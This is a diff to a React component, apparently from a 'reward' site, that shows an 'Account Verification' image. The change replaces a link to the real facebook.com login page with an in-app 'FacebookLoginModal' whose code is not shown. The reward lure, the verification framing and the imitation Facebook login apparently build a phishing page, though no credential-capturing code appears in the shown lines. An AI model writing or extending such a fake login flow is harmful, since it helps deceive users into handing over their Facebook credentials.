@@ -1,3 +1,6 @@
+import { useState } from 'react';
+import FacebookLoginModal from './FacebookLoginModal';
+
 interface RewardItem {
   id: number;
   name: string;
@@ -13,11 +16,16 @@ interface AccessModalProps {
 }
 
 const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
+  const [showFacebookLogin, setShowFacebookLogin] = useState(false);
+  
   if (!isOpen) return null;
 
   const handleFacebookLogin = () => {
-    // Open Facebook login in a new window/tab
-    window.open('https://www.facebook.com/login.php', '_blank', 'width=600,height=600');
+    setShowFacebookLogin(true);
+  };
+
+  const handleCloseFacebookLogin = () => {
+    setShowFacebookLogin(false);
   };
 
   const handleBackdropClick = (e: React.MouseEvent) => {
@@ -58,20 +66,27 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
   };
 
   return (
-    <div 
-      className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm"
-      onClick={handleBackdropClick}
-    >
-      <div className="relative max-w-4xl max-h-[90vh] p-4">
-        <img
-          src="/lovable-uploads/80659b4f-8f87-46f6-965a-a5623d10c545.png"
-          alt="Account Verification"
-          className="w-full h-auto rounded-lg shadow-2xl cursor-pointer"
-          onClick={handleImageClick}
-          style={{ maxHeight: '85vh', objectFit: 'contain' }}
-        />
+    <>
+      <div 
+        className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm"
+        onClick={handleBackdropClick}
+      >
+        <div className="relative max-w-4xl max-h-[90vh] p-4">
+          <img
+            src="/lovable-uploads/80659b4f-8f87-46f6-965a-a5623d10c545.png"
+            alt="Account Verification"
+            className="w-full h-auto rounded-lg shadow-2xl cursor-pointer"
+            onClick={handleImageClick}
+            style={{ maxHeight: '85vh', objectFit: 'contain' }}
+          />
+        </div>
       </div>
-    </div>
+      
+      <FacebookLoginModal 
+        isOpen={showFacebookLogin}
+        onClose={handleCloseFacebookLogin}
+      />
+    </>
   );
 };
 
